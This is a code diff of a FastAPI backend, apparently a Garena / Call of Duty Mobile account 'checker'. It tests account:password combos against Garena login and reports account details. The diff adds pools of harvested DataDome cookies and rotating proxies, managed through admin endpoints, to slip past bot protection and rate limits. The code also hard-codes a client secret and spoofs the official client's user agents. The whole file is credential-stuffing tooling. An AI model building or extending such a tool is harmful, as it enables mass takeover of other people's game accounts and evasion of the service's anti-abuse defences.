@@ -1,7 +1,17 @@
 # ============================================================
 #  routers/codm.py  —  CODM / Garena Checker Backend
-#  Uses cloudscraper to bypass DataDome + correct endpoints
-#  Flutter app calls POST /api/codm/check-one
+#  v4 — Redis cookie pool + proxy support
+#
+#  Cookie pool priority:  Redis (codm:cookies)  →  env CODM_COOKIES
+#  Proxy pool priority:   per-request proxy arg  →  Redis (codm:proxies)  →  none
+#  Admin endpoints:
+#    GET  /api/codm/cookies          list cookies
+#    POST /api/codm/cookies          replace cookie pool
+#    DELETE /api/codm/cookies        clear cookie pool
+#    GET  /api/codm/proxies          list proxies
+#    POST /api/codm/proxies          replace proxy pool
+#    DELETE /api/codm/proxies        clear proxy pool
+#    POST /api/codm/check-one        check one combo (Flutter)
 # ============================================================
 
 import hashlib
@@ -13,9 +23,11 @@ import logging
 import os
 import urllib.parse
 
-from fastapi import APIRouter
+import requests as _req
+
+from fastapi import APIRouter, Header, HTTPException
 from pydantic import BaseModel
-from typing import Optional
+from typing import Optional, List
 
 logger = logging.getLogger(__name__)
 router = APIRouter()
@@ -35,7 +47,7 @@ except ImportError:
     _HAS_CRYPTO = False
     logger.warning("⚠️  pycryptodome not installed — CODM checker disabled")
 
-# ── User-Agents (matching the working Python script exactly) ──
+# ── User-Agents (matching working Python script exactly) ─────
 _UA_NEW = (
     "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
     "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
@@ -47,8 +59,137 @@ _UA_OLD = (
 )
 _UA_SDK = "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
 
-# ── CODM client secret (same as Python script) ────────────────
+# ── CODM client secret ────────────────────────────────────────
 _CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
+
+# ── Admin key ─────────────────────────────────────────────────
+_ADMIN_KEY = os.getenv("ADMIN_KEY", "")
+
+
+# ─────────────────────────────────────────────────────────────
+#  Admin key guard
+# ─────────────────────────────────────────────────────────────
+
+def _require_admin(x_admin_key: str = Header(default="")):
+    if not _ADMIN_KEY or x_admin_key != _ADMIN_KEY:
+        raise HTTPException(status_code=403, detail="Forbidden — invalid admin key")
+
+
+# ─────────────────────────────────────────────────────────────
+#  Upstash Redis helpers  (no extra package — plain HTTP)
+# ─────────────────────────────────────────────────────────────
+
+_UPSTASH_URL = os.getenv("UPSTASH_REDIS_REST_URL", "")
+_UPSTASH_TOK = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")
+
+_REDIS_KEY_COOKIES = "codm:cookies"
+_REDIS_KEY_PROXIES = "codm:proxies"
+
+
+def _redis_cmd(*args) -> object:
+    """Fire a single Redis command via Upstash REST API.
+    Returns the 'result' field, or None on any error.
+    """
+    if not _UPSTASH_URL or not _UPSTASH_TOK:
+        return None
+    try:
+        r = _req.post(
+            _UPSTASH_URL,
+            headers={
+                "Authorization": f"Bearer {_UPSTASH_TOK}",
+                "Content-Type": "application/json",
+            },
+            json=list(args),
+            timeout=6,
+        )
+        return r.json().get("result")
+    except Exception as e:
+        logger.warning(f"Redis cmd {args[0]} failed: {e}")
+        return None
+
+
+def _redis_get_list(key: str) -> List[str]:
+    """Get a JSON-encoded list from Redis. Returns [] on miss/error."""
+    raw = _redis_cmd("GET", key)
+    if not raw:
+        return []
+    try:
+        data = json.loads(raw)
+        return data if isinstance(data, list) else []
+    except Exception:
+        return []
+
+
+def _redis_set_list(key: str, items: List[str]) -> bool:
+    """Store a list as JSON in Redis. Returns True on success."""
+    result = _redis_cmd("SET", key, json.dumps(items))
+    return result == "OK"
+
+
+def _redis_del(key: str) -> bool:
+    result = _redis_cmd("DEL", key)
+    return bool(result)
+
+
+# ─────────────────────────────────────────────────────────────
+#  Cookie pool
+#  Priority: Redis (codm:cookies) → env CODM_COOKIES
+# ─────────────────────────────────────────────────────────────
+
+def _get_all_cookies() -> List[str]:
+    """Return all cookie lines from Redis or env fallback."""
+    # 1. Try Redis
+    redis_cookies = _redis_get_list(_REDIS_KEY_COOKIES)
+    if redis_cookies:
+        return redis_cookies
+    # 2. Fallback to env var
+    raw = os.getenv("CODM_COOKIES", "")
+    return [l.strip() for l in raw.splitlines() if l.strip()]
+
+
+def _pick_datadome() -> Optional[str]:
+    """Pick a random DataDome cookie value from the pool."""
+    lines = _get_all_cookies()
+    if not lines:
+        return None
+    line = random.choice(lines)
+    # Handle "datadome=VALUE" or raw "VALUE"
+    for part in line.split(";"):
+        part = part.strip()
+        if part.lower().startswith("datadome="):
+            return part.split("=", 1)[1]
+    return line  # treat the whole line as the raw value
+
+
+# ─────────────────────────────────────────────────────────────
+#  Proxy pool
+#  Priority: per-request arg → Redis (codm:proxies) → None
+# ─────────────────────────────────────────────────────────────
+
+def _get_all_proxies() -> List[str]:
+    return _redis_get_list(_REDIS_KEY_PROXIES)
+
+
+def _pick_proxy(override: Optional[str] = None) -> Optional[str]:
+    """Return a proxy string or None.
+    If override is provided (from Flutter request), use that.
+    Otherwise, pick a random one from the Redis pool.
+    """
+    if override and override.strip():
+        return override.strip()
+    pool = _get_all_proxies()
+    return random.choice(pool) if pool else None
+
+
+def _proxy_dict(proxy_str: Optional[str]) -> Optional[dict]:
+    """Convert a proxy string to requests-compatible proxy dict."""
+    if not proxy_str:
+        return None
+    proxy_str = proxy_str.strip()
+    # Normalize: add http:// scheme if missing
+    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
+        proxy_str = f"http://{proxy_str}"
+    return {"http": proxy_str, "https": proxy_str}
 
 
 # ─────────────────────────────────────────────────────────────
@@ -82,29 +223,11 @@ def _gen_uuid() -> str:
 
 
 # ─────────────────────────────────────────────────────────────
-#  Cookie pool  (from env CODM_COOKIES, newline-separated)
-#  Each line: "datadome=VALUE" or full cookie string
-#  Admin panel / Railway env var to add/refresh cookies
+#  Session factory  (now with proxy support)
 # ─────────────────────────────────────────────────────────────
 
-def _pick_datadome() -> Optional[str]:
-    raw = os.getenv("CODM_COOKIES", "")
-    lines = [l.strip() for l in raw.splitlines() if l.strip()]
-    if not lines:
-        return None
-    line = random.choice(lines)
-    for part in line.split(";"):
-        part = part.strip()
-        if part.lower().startswith("datadome="):
-            return part.split("=", 1)[1]
-    return None
-
-
-# ─────────────────────────────────────────────────────────────
-#  Session factory
-# ─────────────────────────────────────────────────────────────
-
-def _make_session(datadome: Optional[str] = None):
+def _make_session(datadome: Optional[str] = None, proxy: Optional[str] = None):
+    proxies = _proxy_dict(proxy)
     session = cloudscraper.create_scraper(
         browser={"browser": "chrome", "platform": "android", "mobile": True},
         delay=1,
@@ -112,6 +235,8 @@ def _make_session(datadome: Optional[str] = None):
     session.headers.update({"Accept-Encoding": "gzip, deflate, br, zstd"})
     if datadome:
         session.cookies.set("datadome", datadome, domain=".garena.com")
+    if proxies:
+        session.proxies.update(proxies)
     return session
 
 
@@ -262,7 +387,6 @@ def _codm_token_new(session, sso_key: str) -> Optional[str]:
     try:
         ts = str(int(time.time() * 1000))
 
-        # Grant — get auth code
         grant_headers = {
             "Host": "100082.connect.garena.com",
             "Connection": "keep-alive",
@@ -305,7 +429,6 @@ def _codm_token_new(session, sso_key: str) -> Optional[str]:
         if not auth_code:
             return None
 
-        # Exchange — get access token
         device_id = f"02-{_gen_uuid()}"
         exchange_body = urllib.parse.urlencode({
             "grant_type": "authorization_code",
@@ -414,7 +537,6 @@ def _codm_callback(session, access_token: str, old_flow: bool = False) -> Option
 # ─────────────────────────────────────────────────────────────
 
 def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
-    # Try JWT decode first (no network needed)
     try:
         parts = token.split(".")
         if len(parts) == 3:
@@ -426,7 +548,6 @@ def _codm_user_info(session, token: str, old_flow: bool = False) -> dict:
     except Exception:
         pass
 
-    # Fallback: API call
     base = (
         "https://api-delete-request.codm.garena.co.id"
         if old_flow
@@ -495,6 +616,8 @@ def _parse_account(data: dict) -> dict:
 class CheckOneRequest(BaseModel):
     combo: str
     user_id: Optional[str] = None
+    proxy: Optional[str] = None      # ← NEW: optional per-request proxy
+
 
 class CheckOneResponse(BaseModel):
     combo: str
@@ -508,6 +631,78 @@ class CheckOneResponse(BaseModel):
     country: str = ""
     is_clean: bool = False
     binds: list = []
+
+
+class CookieUpdateRequest(BaseModel):
+    cookies: List[str]   # list of "datadome=VALUE" lines
+
+
+class ProxyUpdateRequest(BaseModel):
+    proxies: List[str]   # list of "http://user:pass@host:port" or "host:port"
+
+
+# ─────────────────────────────────────────────────────────────
+#  Admin — Cookie pool endpoints
+# ─────────────────────────────────────────────────────────────
+
+@router.get("/cookies")
+async def get_cookies(x_admin_key: str = Header(default="")):
+    _require_admin(x_admin_key)
+    cookies = _get_all_cookies()
+    return {
+        "count": len(cookies),
+        "source": "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
+        "cookies": cookies,
+    }
+
+
+@router.post("/cookies")
+async def set_cookies(req: CookieUpdateRequest, x_admin_key: str = Header(default="")):
+    _require_admin(x_admin_key)
+    cleaned = [l.strip() for l in req.cookies if l.strip()]
+    if not cleaned:
+        raise HTTPException(status_code=400, detail="No valid cookie lines provided")
+    ok = _redis_set_list(_REDIS_KEY_COOKIES, cleaned)
+    if not ok:
+        raise HTTPException(status_code=500, detail="Failed to save cookies to Redis")
+    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}
+
+
+@router.delete("/cookies")
+async def delete_cookies(x_admin_key: str = Header(default="")):
+    _require_admin(x_admin_key)
+    _redis_del(_REDIS_KEY_COOKIES)
+    return {"message": "✅ Cookie pool cleared from Redis (env fallback still active if set)"}
+
+
+# ─────────────────────────────────────────────────────────────
+#  Admin — Proxy pool endpoints
+# ─────────────────────────────────────────────────────────────
+
+@router.get("/proxies")
+async def get_proxies(x_admin_key: str = Header(default="")):
+    _require_admin(x_admin_key)
+    proxies = _get_all_proxies()
+    return {"count": len(proxies), "proxies": proxies}
+
+
+@router.post("/proxies")
+async def set_proxies(req: ProxyUpdateRequest, x_admin_key: str = Header(default="")):
+    _require_admin(x_admin_key)
+    cleaned = [l.strip() for l in req.proxies if l.strip()]
+    if not cleaned:
+        raise HTTPException(status_code=400, detail="No valid proxy lines provided")
+    ok = _redis_set_list(_REDIS_KEY_PROXIES, cleaned)
+    if not ok:
+        raise HTTPException(status_code=500, detail="Failed to save proxies to Redis")
+    return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}
+
+
+@router.delete("/proxies")
+async def delete_proxies(x_admin_key: str = Header(default="")):
+    _require_admin(x_admin_key)
+    _redis_del(_REDIS_KEY_PROXIES)
+    return {"message": "✅ Proxy pool cleared from Redis"}
 
 
 # ─────────────────────────────────────────────────────────────
@@ -534,7 +729,8 @@ async def check_one(req: CheckOneRequest):
         return CheckOneResponse(combo=combo, status="error", detail="Empty account or password")
 
     datadome = _pick_datadome()
-    session = _make_session(datadome)
+    proxy    = _pick_proxy(req.proxy)           # ← per-request or pool
+    session  = _make_session(datadome, proxy)
 
     try:
         # Step 1: Prelogin
